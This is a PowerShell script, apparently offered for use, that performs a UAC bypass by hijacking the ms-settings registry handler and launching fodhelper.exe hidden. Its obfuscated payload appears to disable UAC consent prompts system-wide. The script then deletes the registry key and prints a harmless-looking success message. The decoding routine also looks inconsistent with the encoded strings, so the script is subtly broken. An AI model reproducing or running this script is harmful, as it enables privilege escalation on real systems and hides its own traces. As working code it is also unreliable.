# Define XOR decryption function
function Decode-String {
    param (
        [string]$data,
        [string]$pass
    )
    $result = ""
    for ($i = 0; $i -lt $data.Length; $i++) {
        $result += [char]([int]$data[$i] -bxor [int]$pass[$i % $pass.Length])
    }
    return $result
}

# Encryption key and encrypted strings
$key = "secretpass"
$encRegPath = "QIOV]8Zof|csds}Cmbuufs}Wms-sf||jout}Tifmm}pqfo}dpnnbo`"
$encCommand = "sfg/fyf b`` IKMN]TOG|XBSS]Njdsptpg|}Xjo`pxs}Dvssfo|Wfstjpo}Qpmjdjft}Tztufn }w Dpotfo|Qspnq|CfibwjpsB`njo }| SFG_`XPS` }` 0 }g"

# Decrypt at runtime
$regPath = Decode-String $encRegPath $key
$command = Decode-String $encCommand $key

# Set up the registry key
New-Item -Path $regPath -Force | Out-Null
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(default)" -Value $command -Force

# Trigger execution
Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Brief delay to allow execution
Start-Sleep -Seconds 5

# Clean up the registry
$cleanupPath = $regPath -replace "\\Shell\\open\\command$", ""
Remove-Item -Path $cleanupPath -Recurse -Force

# Optional benign output
Write-Host "Operation completed successfully."
